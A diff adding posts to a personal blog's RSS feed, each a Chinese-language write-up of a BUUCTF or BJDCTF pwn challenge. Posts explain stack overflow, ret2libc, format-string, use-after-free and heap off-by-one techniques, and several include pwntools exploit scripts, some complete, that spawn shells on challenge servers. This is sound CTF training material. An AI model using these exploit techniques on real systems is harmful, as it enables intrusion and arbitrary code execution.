@@ -6,10 +6,649 @@
     <description>Recent content in Posts on NiceSeven&#39;s Website</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 06 Feb 2020 18:04:27 +0800</lastBuildDate>
+    <lastBuildDate>Sat, 02 May 2020 22:52:15 +0800</lastBuildDate>
     
 	<atom:link href="https://niceseven.github.io/post/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>BUUCTF Pwn ZJCTF_2019_Login</title>
+      <link>https://niceseven.github.io/post/2020/05/02/buuctf-pwn-zjctf_2019_login/</link>
+      <pubDate>Sat, 02 May 2020 22:52:15 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/05/02/buuctf-pwn-zjctf_2019_login/</guid>
+      <description>BUUCTF Pwn ZJCTF_2019_Login 考点：
+1、ret2libc1
+2、64位函数传参顺序
+3、简单汇编逆向
+4、fgets函数和snprintf函数
+开启了cannary意味着栈溢出覆盖到retn需要leak出canary
+需要输入正确的username和password，但是ida中可以直接看到
+输入正确的username和password后程序直接蹦了
+可以确认只验证password不验证username
+拖入ida分析
+存在/bin/sh，交叉引用跟过去查看
+可以发现Admin::shell()存在后门
+在第二个password_checker函数执行的时候，传入的第一个参数，在函数内执行的时候用形参a1执行了
+(**a1)(&amp;amp;s)，将指向指针的指针a1作为函数执行了，查看汇编代码
+也就是call rax，所以本题的思路是控制rax寄存器也就是控制a1为后门地址，在call rax的时候就可以getshell
+进行逆向分析，回到main函数可以发现
+根据64位传参顺序第一个参数给rdi，可以知道这里传入给a1的值来自main函数中的rax
+这里rax来自main的栈rbp+var_130，最终来自于0x400b93的rax，那么这个rax又来自于哪里呢？
+进入0x400b8e处的call password_checker查看
+可以发现rax来自于rbp+var_18，所以只要控制住了这个rbp+var_18为后门地址就可以控制a1为后门地址，从而控制前面所说的(**a1)来执行后门函数
+回到前面，这个程序有俩个读入的操作，password是通过调用0x400b9f的read_password函数来读入的
+在read_password函数中是利用fgets函数来读
+因为password_checker函数和read_password函数都在在main函数中执行，所以在执行到0x400b9f的read_password函数的时候读入的数据储存的栈空间与0x400b8e的password_check执行时储存数据的栈是同一块，也就是说fgets读入数据的地址s与rbp+var_18是同一块栈空间
+所以在读入password的时候可以填充0x60-0x18-14=58可以覆盖到var_18为后门的地址
+回到第二个password_checker函数
+可以发现需要绕过if(!strcmp(a2,a3))，回顾分析
+可以知道v4是程序储存的密码，v5是我们输入的密码（本程序只验证password不验证username），也就是说在第二个password_checker函数中的a2是我们输入的密码，a3是程序储存的密码，所以可以使用\x00截断字符来绕过strcmp函数
+接下来的一个坑点就是在snprintf这个函数中，从函数参数可以看到第一个&amp;amp;s地址与最后一个&amp;amp;s地址是和前面的rbp+var_18和s是同一块栈，所以在执行snprintf函数实际上是在重复覆盖，将原本储存的字符用%s格式化之后取最多0x50字节又储存到同一个地方，所以有可能就会将我们前面覆盖的rbp+var_18给覆盖，导致rax改变，从而无法getshell，解决办法就是使用\x00来截断，所以一共需要\x00截断两次，一次的截断输入的密码，一次是截断snprintf的输入
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import* import sys #from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; #context.terminal = [&amp;#39;terminator&amp;#39;,&amp;#39;-x&amp;#39;,&amp;#39;sh&amp;#39;,&amp;#39;-c&amp;#39;] binary = &amp;#39;./zjctf2019_login&amp;#39; local = 0 if local == 1: sh = process(binary) else: sh = remote(&amp;#34;node3.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_test_your_memory</title>
+      <link>https://niceseven.github.io/post/2020/05/02/buuctf-pwn-jarvisoj_test_your_memory/</link>
+      <pubDate>Sat, 02 May 2020 20:09:48 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/05/02/buuctf-pwn-jarvisoj_test_your_memory/</guid>
+      <description>BUUCTF Pwn Jarvisoj_test_your_memory 考点：
+1、32位栈溢出
+3、ret2libc2
+main函数
+mem_test函数
+stack offset = 0x13 + 0x4(leave)
+存在system()和字符串&amp;quot;cat flag&amp;quot;
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- #from LibcSearcher import * from pwn import* import sys context.log_level = &amp;#39;debug&amp;#39; context.terminal = [&amp;#39;terminator&amp;#39;,&amp;#39;-x&amp;#39;,&amp;#39;sh&amp;#39;,&amp;#39;-c&amp;#39;] binary = &amp;#39;./memory&amp;#39; local = 0 if local == 1: sh = process(binary) else: sh = remote(&amp;#34;node3.buuoj.cn&amp;#34;,27316) elf = ELF(binary) #libc=elf.libc #libc = ELF(&amp;#39;./.so&amp;#39;) fakerebp = 0x4 offset = 0x13 + fakerebp system_addr = elf.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Hitcontraining_uaf</title>
+      <link>https://niceseven.github.io/post/2020/04/28/buuctf-pwn-hitcontraining_uaf/</link>
+      <pubDate>Tue, 28 Apr 2020 21:35:04 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/28/buuctf-pwn-hitcontraining_uaf/</guid>
+      <description>BUUCTF Pwn Hitcontraining_uaf 考点：
+1、UAF（use after free）
+2、fastbin bin机制
+3、heap的分配规则
+在delete功能中，指针未置NULL造成UAF漏洞
+chunk的数据结构
+struct notelist{ void * printf_note_content; char * content; }      size=0x8     p_notelist printf_note_content p_content     size=add()   p_content content     print_note功能中会执行printf_note_content函数
+利用原理：
+chunk中存了printf_note_content函数指针，利用fastbin的单链表的机制先add两个fastbin大小的chunk0、chunk1，然后按chunk0、chunk1的顺序来free，这个时候fastbin的链表就是-&amp;gt;chunk1-&amp;gt;chunk0，再add一个0x8字节大小的chunk2，chunk2实际上前0x8字节分配到的是chunk1的p_notelist指针所指向的heap空间，然后存的p_content指针指向的是chunk0的p_notelist指针所在的heap空间也就说我们在add chunk2的时候内容真正写入位置覆盖了chunk0前8个字节中的printf_note_content指针，因为UAF的缘故，实际上chunk0的p_notelist指针没有释放，我们只需要show(chunk0)，正常情况下是执行printf_note_content函数来输出p_content指针指向的内容，但是printf_note_content指针被覆盖成magic函数的指针了，所以会执行magic函数从而getshell
+#-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; sh = process(&amp;#39;./hacknote&amp;#39;) elf = ELF(&amp;#39;./hacknote&amp;#39;) #libc = ELF(&amp;#39;./x86_ubuntu16_libc-2.23.so&amp;#39;) def add(size,content): sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Roarctf_2019_easy_pwn</title>
+      <link>https://niceseven.github.io/post/2020/04/23/buuctf-pwn-roarctf_2019_easy_pwn/</link>
+      <pubDate>Thu, 23 Apr 2020 18:05:59 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/23/buuctf-pwn-roarctf_2019_easy_pwn/</guid>
+      <description>BUUCTF Pwn Roarctf_2019_easy_pwn 考点：
+1、heap off-by-one
+2、chunk extend overlapping
+3、fast bin attack
+4、use one_gadget
+大致功能是添加、编辑、显示、删除，明显的堆题
+漏洞点：delete中无UAF，关键漏洞在edit中
+sub_E26中
+在执行edit的时候要求输入一个size，这个size会与add的时候输入的size作比较，满足edit输入的size减去add输入的size为10，则将我们接下来能够输入的数据+1字节，从而触发off-by-one漏洞
+利用off-by-one漏洞可以执行chunk extend overlapping漏洞，结合unsorted bin的机制可以leak出libc中的main_arena地址，利用leak出的地址来计算偏移libc
+1、利用off-by-one+chunk overlapping来leak出libc地址 1、add4个chunk
+2、执行off-by-one，从chunk0溢出\x91到chunk1
+3、free掉chunk1来切割unsorted bin也就是我们伪造的0x90大小的chunk
+4、add chunk1原本的大小56字节=0x38&amp;lt;=0x40(chunk自动对齐)
+需要leak的地址就落在chunk2中了，因为chunk2并没有free所以直接show chunk2可以leak出地址
+在leak步骤中需要修改的chunk1的size字段的值要满足unsorted bin也就是说要大于fastbin的0x80，然后free就会将这个满足的chunk块写入unsorted bin中
+才会在下一个chunk中的fd和bk中泄露出libc的main_arena地址，因为
+1、释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中
+2、当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE（0x20），就会被放到 unsorted bin 中
+2、利用chunk overlapping+fastbin attach来迁移chunk 主要利用chunk中的fd字段来迁移chunk到malloc_hook附件，使我们下次add的chunk就是在malloc_hook附近然后edit这个chunk来修改内容(指针)
+下图就是修改后的fd字段指向malloc_hook附近，然后add得到这里的内存空间作为chunk
+然后利用edit来修改chunk也就是修改malloc_hook和realloc_hook(他们俩相邻)
+3、利用伪造的chunk来修改malloc_hook和realloc_hook 注意：
+这里利用的one_gadget条件无法达成，所以需要利用realloc来调整rsp的值来达成getshell的条件
+https://blog.csdn.net/Maxmalloc/article/details/102535427
+修改__malloc_hook指向realloc，然后修改__realloc_hook来指向one_gedget，最后执行一次add就会执行calloc-&amp;gt;malloc_hook-&amp;gt;realloc-&amp;gt;realloc_hook-&amp;gt;one_gadget-&amp;gt;execve(&amp;quot;/bin/sh&amp;quot;)
+exp</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_level4</title>
+      <link>https://niceseven.github.io/post/2020/04/15/buuctf-pwn-jarvisoj_level4/</link>
+      <pubDate>Wed, 15 Apr 2020 18:39:32 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/15/buuctf-pwn-jarvisoj_level4/</guid>
+      <description>BUUCTF Pwn Jarvisoj_level4 考点
+1、32位栈溢出
+2、leak地址，计算基地址，计算libc函数地址
+3、ret2libc3
+buuctf平台给出了libc版本，但是本题原本是没有libc的，这里可以使用LibcSearcher或者pwntools自带的DynELF来计算libc中函数的偏移
+#!/usr/bin/env python2 #-*- cofing=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./jarvisoj_level4&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28460) elf = ELF(&amp;#39;./jarvisoj_level4&amp;#39;) libc = ELF(&amp;#39;./ubuntu16-x86-libc-2.23.so&amp;#39;) write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#39;write&amp;#39;] main = elf.symbols[&amp;#39;main&amp;#39;] fakerebp = 0x4 offset = 0x88 + fakerebp payload1 = &amp;#39;a&amp;#39;*offset + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4) sh.sendline(payload1) write_addr = u32(sh.recv(4)) base = write_addr - libc.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Bjdctf_2020_babyrop</title>
+      <link>https://niceseven.github.io/post/2020/04/15/buuctf-pwn-bjdctf_2020_babyrop/</link>
+      <pubDate>Wed, 15 Apr 2020 17:34:23 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/15/buuctf-pwn-bjdctf_2020_babyrop/</guid>
+      <description>BUUCTF Pwn Bjdctf_2020_babyrop 考点
+1、64位栈溢出
+2、leak地址
+4、libc函数地址计算
+思路
+1、栈溢出使用puts_plt来leak出puts_got地址
+2、通过puts_got地址来计算基地址，从而计算出system、/bin/sh地址
+3、栈溢出getshell
+由于puts()函数只需要一个参数，所以只需要pop rdi；ret；这个gadget来传参
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./jarvisoj_level3_x64&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,29484) elf = ELF(&amp;#39;./bjdctf_2020_babyrop&amp;#39;) libc = ELF(&amp;#39;./ubuntu16-x64-libc-2.23.so&amp;#39;) rdi_ret = 0x400733 fakerbp = 0x8 offset = 0x20 + fakerbp puts_plt = elf.plt[&amp;#39;puts&amp;#39;] puts_got = elf.got[&amp;#39;puts&amp;#39;] vuln_fun = elf.symbols[&amp;#39;vuln&amp;#39;] payload1 = &amp;#39;a&amp;#39;*offset + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_fun) payload1 += p64(vuln_fun) sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_level3_x64</title>
+      <link>https://niceseven.github.io/post/2020/04/14/buuctf-pwn-jarvisoj_level3_x64/</link>
+      <pubDate>Tue, 14 Apr 2020 15:25:46 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/14/buuctf-pwn-jarvisoj_level3_x64/</guid>
+      <description>BUUCTF Pwn Jarvisoj_level3_x64 考点
+1、64位栈溢出
+2、leak地址
+3、libc函数地址计算
+首先要了解64位函数执行的参数传递，前6个参数是依次传入rdi、rsi、rdx、rcx、r8、r9寄存器的，超出6个的再传入栈中
+例如要执行system(&amp;quot;/bin/sh&amp;quot;)，首先要把“/bin/sh”地址传入rdi寄存器，然后再call system
+要执行write(1,&amp;ldquo;hello&amp;rdquo;,5)，首先要把1-&amp;gt;rdi；&amp;ldquo;hello&amp;quot;-&amp;gt;rsi；5-&amp;gt;rdx，再call write
+在rop链中主要是利用pop rdi；pop rsi；pop rdx；ret；等gadget来传参
+本题明显的栈溢出，栈大小为0x80，但是可以读入0x200，但是本题没有system、&amp;quot;/bin/sh&amp;quot;
+所以需要leak出libc地址来计算libc中system()和&amp;rdquo;/bin/sh&amp;quot;偏移
+思路：
+1、栈溢出leak出write或者read地址
+2、计算libc基地址
+3、栈溢出getshell
+前面说过64位的系统函数传参前3个参数要用到rdi、rsi、rdx，但是通过ROPgadget查找缺少了rdx
+所以使用wiki里的方法ret2cas
+ret2cas主要是用到如下的两个gadget，通过pop和mov控制rdi、rsi、rdx寄存器，注意0x4006a1-0x4006a4这里有个比较rbx和rbp是否相同然后执行jne跳转的指令段，所以在执行gadget1要构造rbx=0，rbp=1，才不会进入哪个循环的跳转，通过gadget1中的pop r12和0x400699的call r12+rbx*8来控制我们想执行的函数，本题要执行 write来leak所以我们传入r12的值为write_got，这里传入plt好像执行不了具体原因还不清楚，为了满足call r12所以需要rbx=0，这样r12+rbx*8=r12=write_got =&amp;gt; call write_got，参数1传入r15，参数2传入r14，参数3传入r13，这样在执行gadget2之后就会使参数1到3分别mov到rdi、rsi、rdx，也就是64位程序的前3个参数传参顺序
+在构造leak的payload时候需要0x38的数据填充，是因为我们先执行的gadget1，再执行gadget2，但是gadget1在gadget2后面，所以执行完gadget2之后又会执行一遍gadget1，但是gadget1之前执行完已经达到我们的目的了，所以第2遍执行是不需要的，然后看在执行gadget1的时候栈空间是0x7fffffffe100-0x7fffffffe138共0x38的大小，所以这里填充0x38是为了覆盖完这里执行的栈空间，然后覆盖到0x4006b4的ret来使函数返回，因为要执行两次read所以这里使函数返回到main()或者vulnerable_function()，从而再执行一遍read来进行栈溢出getshell
+ida中也可以看栈指针来计算空间大小0x38-0x0=0x38
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./jarvisoj_level3_x64&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28736) elf = ELF(&amp;#39;./jarvisoj_level3_x64&amp;#39;) libc = ELF(&amp;#39;./ubuntu16-x64-libc-2.23.so&amp;#39;) rdi_ret = 0x4006b3 rsi_r15_ret = 0x4006b1 rbx_rbp_r12_r13_r14_r15_ret = 0x4006aa mov_rdx_r13_rsi_r14_edi_r15_ret = 0x400690 fakerbp = 0x8 offset = 0x80 + fakerbp write_plt = elf.</description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn Test</title>
+      <link>https://niceseven.github.io/post/2020/04/12/bjdctf-2nd-pwn-test/</link>
+      <pubDate>Sun, 12 Apr 2020 22:46:52 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/12/bjdctf-2nd-pwn-test/</guid>
+      <description>BJDCTF 2nd Pwn Test ssh连接linux环境，存在flag文件非root无权限读写
+给出了源码闯入参数给数组cmd，经过一系列过滤，最后执行system，所以直接system(&amp;ldquo;cat flag&amp;rdquo;)行不通
+看看环境变量
+使用grep加上正则匹配来筛选出，经过过滤后还有那些命令能执行
+注意这里的-v选项表示：显示不包含匹配文本的所有行，-E表示使用使用ERE模式（扩展正则表达式）的正则匹配来匹配，后门接的就是正则语句
+发现od这条命令还可以用，od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来
+066146-000401就是flag的八进制字节码，转成字符串就行了
+#!/uer/bin/env python3 #-*- coding=UTF-8 -*- import binascii tmp = &amp;#34;066146 063541 030173 061464 063065 061062 026542 061471 060464 032055 060471 026470 030541 030064 061055 033066 030461 030071 030470 031143 076545 077412 046105 001106 000401&amp;#34; for i in tmp.split(&amp;#34;&amp;#34;): try: print(binascii.unhexlify(bytes(hex(int(i,8))[2:],encoding=&amp;#34;UTF-8&amp;#34;)).decode(&amp;#34;utf-8&amp;#34;)[::-1],end=&amp;#34;&amp;#34;) except Exception as e: continue 非预期解
+x86_64命令没有禁用
+原理就是：x86_64链接的是setarch命令，而setarch默认运行程序是/bin/sh，注意这里的权限是root</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Others_shellcode</title>
+      <link>https://niceseven.github.io/post/2020/04/09/buuctf-pwn-others_shellcode/</link>
+      <pubDate>Thu, 09 Apr 2020 22:33:29 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/09/buuctf-pwn-others_shellcode/</guid>
+      <description>BUUCTF Pwn Others_shellcode 直接系统调用给shell，让我很迷惑</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_tell_me_something</title>
+      <link>https://niceseven.github.io/post/2020/04/09/buuctf-pwn-jarvisoj_tell_me_something/</link>
+      <pubDate>Thu, 09 Apr 2020 20:16:37 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/09/buuctf-pwn-jarvisoj_tell_me_something/</guid>
+      <description>BUUCTF Pwn Jarvisoj_tell_me_something 考点：栈溢出
+64位程序，开启nx
+存在一个函数读flag
+栈溢出到good_game()来读flag
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,25264) offset = 0x88 fakerbp = 0x8 #这里retn之前没有leave指令，所以没有rbp需要覆盖，栈填满之后直接覆盖retn flag_addr = 0x400620 payload = &amp;#39;a&amp;#39;*offset + p64(flag_addr) sh.sendlineafter(&amp;#34;message:&amp;#34;,payload) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_fm</title>
+      <link>https://niceseven.github.io/post/2020/04/09/buuctf-pwn-jarvisoj_fm/</link>
+      <pubDate>Thu, 09 Apr 2020 19:30:44 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/09/buuctf-pwn-jarvisoj_fm/</guid>
+      <description>BUUCTF Pwn Jarvisoj_fm 考点：格式化字符串改写任意地址内容
+32位，开启canary、nx
+存在printf可以利用格式化字符串漏洞修改x的内容为4来绕过if判断从而getshell
+x地址为0x0804a02c，.data有读写权限
+输入的第1个内容的栈偏移为11个单位（32位4字节）
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./jarvisoj_fm&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26325) #gdb.attach(sh) x_addr = 0x0804a02c #将栈偏移13个单位处的x_addr指针指向的地址内容修改为4 #payload中x_addr写入的位置为栈偏移13处，见下图 #25346225(小端)是栈偏移11，所以2ca00408(小端)是栈偏移11+2=13 payload = &amp;#39;%4c%13$n&amp;#39; + p32(x_addr) #pause() sh.sendline(payload) sh.sendline(&amp;#39;cat flag&amp;#39;) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn R2t4</title>
+      <link>https://niceseven.github.io/post/2020/04/09/bjdctf-2nd-pwn-r2t4/</link>
+      <pubDate>Thu, 09 Apr 2020 15:51:07 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/09/bjdctf-2nd-pwn-r2t4/</guid>
+      <description>BJDCTF 2nd Pwn R2t4 考点:
+1、格式化字符串漏洞修改任意地址内容
+2、了解canary和__stack_chk_fail的工作原理
+64位，开启Canary所以需要leak出canary或者改写__stack_chk_fail等其他方法绕过
+存在后门（system(&amp;ldquo;cat flag&amp;quot;)），存在canary且只可以溢出8字节的数据不够形成rop链，所以无法直接通过栈溢出来cat flag，但是存在格式化字符串漏洞，可以利用此漏洞修改任意地址的内容
+利用格式化字符串漏洞需要知道我们的输入在栈中的偏移，才能使用$n来修改某个偏移位置的指针所指向地址的内容可以利用%p来测试
+这样我们就知道我们的第一个输入在栈中的偏移为6了，这样就可以构造格式化字符串来改写内容了，如下图栈偏移的9、10处覆盖为需要被修改内容的地址也就是指针，然后通过$n就能改写指针内容
+（%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置）
+上下两图栈地址不一样是因为我分开调试的，地址随机化造成的，但是偏移量不变对理解思路无影响
+利用格式化字符串漏洞修改任意地址的漏洞，将__stack_chk_fail@got执行的函数地址修改为system(&amp;ldquo;cat flag&amp;rdquo;)的地址，然后故意覆盖cannry(rbp+8)使执行__stack_chk_fail，这样在执行__stack_chk_fail的时候实际是执行system(&amp;ldquo;cat flag&amp;rdquo;)
+system(&amp;ldquo;cat flag&amp;quot;)的地址为0x00400626，因为是小端存储，所以我们需要将高字节写入高地址，低字节写入低地址，也是就将0x0040写入0x601018+2的地址，0x0626写入0x601018，这样系统再读0x601018的内容时也就识别为0x00400626，
+这里exp使用的$hn表示是以2个字节写入，一次写入2字节，当然也可以选择一次写入4、8字节但是这样可能会导致程序崩溃，所以具体多少字节的写入要看具体情况（%$hhn表示写入的地址空间为1字节，$n表示写入的地址空间为4字节，%$lln表示写入的地址空间为8字节）
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./r2t4&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28578) elf = ELF(&amp;#39;./r2t4&amp;#39;) #gdb.attach(sh) __stack_chk_fail = elf.got[&amp;#39;__stack_chk_fail&amp;#39;] print hex(__stack_chk_fail) #%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置 #%c：输出字符，配上%n可用于向指定地址写数据 #这里payload的意思是将64以双字节(%hn)的形式赋给栈偏移为9的指针，将64+1510也是以双字节的形式赋给栈偏移为10的指针 #当然这里是使用16进制来赋值，64的16进制为0x0040，64+1510的16进制为0x0626 #最后两个p64是为了将栈偏移处覆盖为我们需要的修改的指针，如上图的栈内容 payload = &amp;#39;%64c%9$hn%1510c%10$hnAAA&amp;#39; + p64(__stack_chk_fail+2) + p64(__stack_chk_fail) #pause() sh.sendline(payload) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn 铁人三项[第五赛区]_2018_rop</title>
+      <link>https://niceseven.github.io/post/2020/04/06/buuctf-pwn-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA_2018_rop/</link>
+      <pubDate>Mon, 06 Apr 2020 22:50:22 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/06/buuctf-pwn-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA_2018_rop/</guid>
+      <description>BUUCTF Pwn 铁人三项[第五赛区]_2018_rop 考点
+1、栈溢出
+2、ret2libc
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./2018_rop&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,25257) elf = ELF(&amp;#39;./2018_rop&amp;#39;) libc = ELF(&amp;#39;./ubuntu18-x86-libc-2.27.so&amp;#39;) main_addr = elf.symbols[&amp;#39;main&amp;#39;] write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#39;write&amp;#39;] libc_write = libc.symbols[&amp;#39;write&amp;#39;] libc_system = libc.symbols[&amp;#39;system&amp;#39;] libc_binsh = libc.search(&amp;#39;/bin/sh&amp;#39;).next() offset = 0x88 #到ebp的偏移，到retn还需要+0x4的ebp大小 ebp = 0x4 payload = &amp;#39;a&amp;#39;*(offset+ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #write来泄露write真实地址，write的返回为main sh.sendline(payload) write_real_addr = u32(sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_level3</title>
+      <link>https://niceseven.github.io/post/2020/04/06/buuctf-pwn-jarvisoj_level3/</link>
+      <pubDate>Mon, 06 Apr 2020 21:51:02 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/06/buuctf-pwn-jarvisoj_level3/</guid>
+      <description>BUUCTF Pwn Jarvisoj_level3 考点：
+1、栈溢出
+2、ret2libc
+使用的是kali2020，libc的原因本地打不通，远程可以打
+利用write_plt打印出write_got，计算基地址偏移，计算system和&amp;rdquo;/bin/sh&amp;quot;地址，然后溢出执行system(&amp;quot;/bin/sh&amp;quot;)
+第一个payload中执行完write返回地址为mian，让程序能够第二次执行read()
+第二个payload执行getshell
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./jarvisoj_level3&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28063) elf = ELF(&amp;#39;./jarvisoj_level3&amp;#39;) libc = ELF(&amp;#39;./ubuntu16-x86-libc-2.23.so&amp;#39;) offset = 0x88 ebp = 0x4 main_addr = elf.symbols[&amp;#39;main&amp;#39;] write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#39;write&amp;#39;] libc_write = libc.symbols[&amp;#39;write&amp;#39;] libc_system = libc.symbols[&amp;#39;system&amp;#39;] libc_binsh = libc.search(&amp;#39;/bin/sh&amp;#39;).next() payload = &amp;#39;a&amp;#39;*(offset+ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Ciscn_2019_es_2</title>
+      <link>https://niceseven.github.io/post/2020/04/05/buuctf-pwn-ciscn_2019_es_2/</link>
+      <pubDate>Sun, 05 Apr 2020 00:13:37 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/05/buuctf-pwn-ciscn_2019_es_2/</guid>
+      <description>BUUCTF Pwn Ciscn_2019_es_2 考点：栈迁移、栈复用
+漏洞在vul()函数，可以读两次数据，s的栈大小为0x28，而两次读入都可以读0x30，0x30-0x28=8字节可以溢出，然后覆盖ebp、retn之后返回到hack函数发现echo flag就真的是的echo “flag”这个四个字符，没办法只能getshell然后cat flag
+本题的考点是栈迁移，我们可以发现利用栈溢出去getshell溢出空间不够用，本题可以看到可以read两次，第二次read会把第一次read的覆盖掉，首先要明确printf函数打印出的字符串是到\x00截止的，所以这里的第一个read和printf可以泄露出s栈中的ebp
+使用如下payload来调试
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; sh = process(&amp;#39;./ciscn_2019_es_2&amp;#39;) gdb.attach(sh)#打开gdb offset = 0x28 payload = &amp;#39;a&amp;#39;*offset pause()#下断点 sh.sendafter(&amp;#34;your name?&amp;#34;,payload) 可以看到栈里面的内容存在0x00000000，所以我们printf出来的数据会到这里截止，如下图
+所以这里的ebp就是0xffd64038，通过这个ebp我们就能计算出ebp到第一个输入的字符的偏移
+这里第一个字符&#39;a&#39;的地址是0xffd64000，ebp是0xffd64038，所以偏移为56字节
+得到这个偏移无论ebp地址如何变化通过偏移都能计算出第一个读入的字符的地址也就是相当于&amp;amp;s的地址
+第二次read就可以来实现栈迁移了，栈迁移的精髓就是使用两次leave;ret;指令，leave相当于mov esp，ebp；pop ebp；ret相当于pop eip，这里的pop是把esp所指向的内容赋给指定寄存器，如pop ebp就是将当前esp指向的内容赋给ebp寄存器，因为pop是出栈的意思所以还有个隐藏操作就是把esp+4，为什么是+4而不是-4，是因为栈的从高地址向低地址生长的，我们压入(push)一个数据则esp就要-4，pop出一个数据则esp+4，这里4是因为在32位的架构中地址都是4字节的，若在64位架构则是8字节，需要+-8
+本题还一个特殊的地方是栈迁移的目的地是同一个栈，我们利用第二个read进行栈迁移将栈迁移到&amp;amp;s开始的地方又执行一遍
+可以使用如下payload来调试
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; sh = process(&amp;#39;./ciscn_2019_es_2&amp;#39;) elf = ELF(&amp;#39;./ciscn_2019_es_2&amp;#39;) gdb.attach(sh)#开启gdb offset = 0x28 ebp = 0x4 leave_ret = 0x080484b8#这里是leave；ret；一个gadget main_addr = elf.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Bjdctf_2020_babystack</title>
+      <link>https://niceseven.github.io/post/2020/04/03/buuctf-pwn-bjdctf_2020_babystack/</link>
+      <pubDate>Fri, 03 Apr 2020 21:23:43 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/03/buuctf-pwn-bjdctf_2020_babystack/</guid>
+      <description>BUUCTF Pwn Bjdctf_2020_babystack 64位程序开启NX，有system(&amp;quot;/bin/sh&amp;quot;)，简单栈溢出
